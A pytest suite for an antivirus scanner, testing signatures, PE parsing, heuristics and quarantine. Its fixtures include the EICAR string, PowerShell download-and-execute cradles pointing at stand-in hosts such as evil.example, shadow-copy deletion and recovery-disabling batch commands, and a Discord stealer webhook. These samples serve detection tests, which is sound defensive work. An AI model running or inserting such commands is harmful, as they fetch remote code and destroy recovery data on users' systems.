"""Тесты ядра: сигнатуры, PE-разбор, эвристики, карантин, история."""
from __future__ import annotations

import struct
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from onlyunlocker.core import pe
from onlyunlocker.core.models import Verdict
from onlyunlocker.core.quarantine import Quarantine
from onlyunlocker.core.scanner import ScanEngine, ScanSettings
from onlyunlocker.core.signatures import SignatureDatabase
from onlyunlocker.core.storage import History, Settings
from onlyunlocker.core.utils import entropy, human_size

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture()
def engine(tmp_path, monkeypatch) -> ScanEngine:
    monkeypatch.setenv("ONLYUNLOCKER_DATA", str(tmp_path / "data"))
    return ScanEngine(SignatureDatabase.load(), ScanSettings(workers=2))


def write(tmp_path: Path, name: str, content: str | bytes) -> str:
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content.encode() if isinstance(content, str) else content)
    return str(path)


# --- сигнатуры ---------------------------------------------------------------


def test_database_loads():
    db = SignatureDatabase.load()
    assert db.total > 20
    assert db.version
    assert any(h.name.startswith("EICAR") for h in db.hashes.values())


def test_pattern_masks():
    from onlyunlocker.core.signatures import _hex_to_bytes_regex

    regex = _hex_to_bytes_regex("4D 5A ?? 00")
    assert regex.search(b"MZ\x90\x00")
    assert not regex.search(b"ZZ\x90\x00")


# --- сканер ------------------------------------------------------------------


def test_eicar_is_malicious(tmp_path, engine):
    report = engine.scan_file(write(tmp_path, "eicar.com", EICAR))
    assert report.verdict == Verdict.MALICIOUS
    assert any(d.category == "signature" for d in report.detections)


def test_clean_file(tmp_path, engine):
    report = engine.scan_file(write(tmp_path, "notes.txt", "Просто заметки о планах на неделю."))
    assert report.verdict == Verdict.CLEAN
    assert report.score == 0


def test_powershell_loader(tmp_path, engine):
    payload = (
        "powershell -EncodedCommand " + "A" * 80 + "\n"
        'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example/x.ps1")\n'
    )
    report = engine.scan_file(write(tmp_path, "loader.ps1", payload))
    assert report.verdict == Verdict.MALICIOUS
    rules = {d.rule for d in report.detections}
    assert "RULE:Script.PowerShell.DownloadCradle" in rules


def test_ransomware_batch(tmp_path, engine):
    payload = "vssadmin delete shadows /all /quiet\nbcdedit /set recoveryenabled no\n"
    report = engine.scan_file(write(tmp_path, "enc.bat", payload))
    assert report.verdict == Verdict.MALICIOUS
    assert report.score >= 70


def test_stealer_webhook_is_suspicious(tmp_path, engine):
    payload = "url = 'https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789'"
    report = engine.scan_file(write(tmp_path, "stealer.py", payload))
    assert report.verdict in (Verdict.SUSPICIOUS, Verdict.MALICIOUS)
    assert any("Discord" in d.title for d in report.detections)


def test_double_extension(tmp_path, engine):
    report = engine.scan_file(write(tmp_path, "invoice.pdf.exe", b"MZ" + b"\x00" * 100))
    assert any(d.rule == "HEUR:DoubleExtension" for d in report.detections)


def test_scan_directory(tmp_path, engine):
    write(tmp_path, "a.bat", "vssadmin delete shadows /all /quiet\n")
    write(tmp_path, "b.txt", "hello")
    (tmp_path / "sub").mkdir()
    write(tmp_path, "sub/c.ps1", "iex (iwr http://x.example/y).Content")
    summary = engine.scan([str(tmp_path)], mode="custom")
    assert summary.scanned >= 2
    assert summary.infected >= 1
    assert summary.finished_at >= summary.started_at


def test_cancel(tmp_path, engine):
    import threading

    for i in range(5):
        write(tmp_path, f"f{i}.txt", "data")
    cancel = threading.Event()
    cancel.set()
    summary = engine.scan([str(tmp_path)], mode="custom", cancel=cancel)
    assert summary.cancelled


# --- PE ----------------------------------------------------------------------


def _minimal_pe(bits: int = 64, imports: list[str] | None = None) -> bytes:
    """Собирает валидный PE минимального размера для тестов разбора."""
    is64 = bits == 64
    opt_size = 240 if is64 else 224
    data = bytearray(b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40))
    data += b"PE\x00\x00"
    machine = 0x8664 if is64 else 0x14C
    data += struct.pack("<HHIIIHH", machine, 1, 0x60000000, 0, 0, opt_size, 0x22)
    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, 0x20B if is64 else 0x10B)
    struct.pack_into("<I", opt, 16, 0x1000)  # entry point
    if is64:
        struct.pack_into("<Q", opt, 24, 0x140000000)
        num_dirs_off = 108
    else:
        struct.pack_into("<I", opt, 28, 0x400000)
        num_dirs_off = 92
    struct.pack_into("<H", opt, 68, 3)  # console
    struct.pack_into("<I", opt, num_dirs_off, 16)
    data += opt
    header_end = len(data) + 40
    section_raw = ((header_end + 0x1FF) // 0x200) * 0x200
    data += b".text\x00\x00\x00" + struct.pack("<IIII", 0x200, 0x1000, 0x200, section_raw)
    data += b"\x00" * 12 + struct.pack("<I", 0x60000020)
    data += b"\x00" * (section_raw - len(data))
    data += b"\x90" * 0x200
    return bytes(data)


def test_pe_parse_minimal():
    info = pe.analyze(_minimal_pe())
    assert info.is_pe and info.is_64bit
    assert info.machine == "x64"
    assert info.subsystem == "CUI"
    assert info.entry_section == ".text"
    assert info.sections[0].name == ".text"


def test_pe_rejects_garbage():
    assert not pe.analyze(b"not a pe file at all").is_pe
    assert not pe.analyze(b"").is_pe


def test_pe_no_imports_detection(tmp_path, engine):
    report = engine.scan_file(write(tmp_path, "stub.exe", _minimal_pe()))
    rules = {d.rule for d in report.detections}
    assert "HEUR:PE.NoImports" in rules


def test_pe_packer_section(tmp_path, engine):
    payload = _minimal_pe().replace(b".text\x00\x00\x00", b"UPX0\x00\x00\x00\x00", 1)
    report = engine.scan_file(write(tmp_path, "packed.exe", payload))
    assert any("UPX" in d.title for d in report.detections)


# --- утилиты -----------------------------------------------------------------


def test_entropy_bounds():
    assert entropy(b"") == 0.0
    assert 0 < entropy(bytes(range(256))) <= 8
    assert entropy(b"a" * 1000) == 0.0


def test_human_size():
    assert human_size(512) == "512 Б"
    assert human_size(2048) == "2.0 КБ"


# --- карантин ----------------------------------------------------------------


def test_quarantine_roundtrip(tmp_path, engine):
    path = write(tmp_path, "sample.com", EICAR)
    report = engine.scan_file(path)
    quarantine = Quarantine(tmp_path / "q")
    item = quarantine.add(report)
    assert not Path(path).exists()
    assert quarantine.count == 1
    stored = (tmp_path / "q" / item.stored_name).read_bytes()
    assert stored.startswith(b"OLQ1")
    assert EICAR.encode() not in stored

    restored = quarantine.restore(item.id)
    assert Path(restored).read_text() == EICAR
    assert quarantine.count == 0


def test_quarantine_delete(tmp_path, engine):
    path = write(tmp_path, "x.com", EICAR)
    quarantine = Quarantine(tmp_path / "q")
    item = quarantine.add(engine.scan_file(path))
    quarantine.delete(item.id)
    assert quarantine.items() == []
    assert not (tmp_path / "q" / item.stored_name).exists()


# --- настройки и журнал ------------------------------------------------------


def test_settings_roundtrip(tmp_path):
    settings = Settings(tmp_path / "s.json")
    settings.set("workers", 7)
    assert Settings(tmp_path / "s.json").get("workers") == 7
    assert settings.get("unknown_key", "fallback") == "fallback"


def test_history(tmp_path, engine):
    history = History(tmp_path / "h.jsonl")
    write(tmp_path, "a.bat", "vssadmin delete shadows /all /quiet\n")
    summary = engine.scan([str(tmp_path / "a.bat")], mode="custom")
    history.add(summary)
    entries = history.entries()
    assert len(entries) == 1
    assert entries[0]["scanned"] == 1
    stats = history.stats()
    assert stats["scans"] == 1
    history.clear()
    assert history.entries() == []
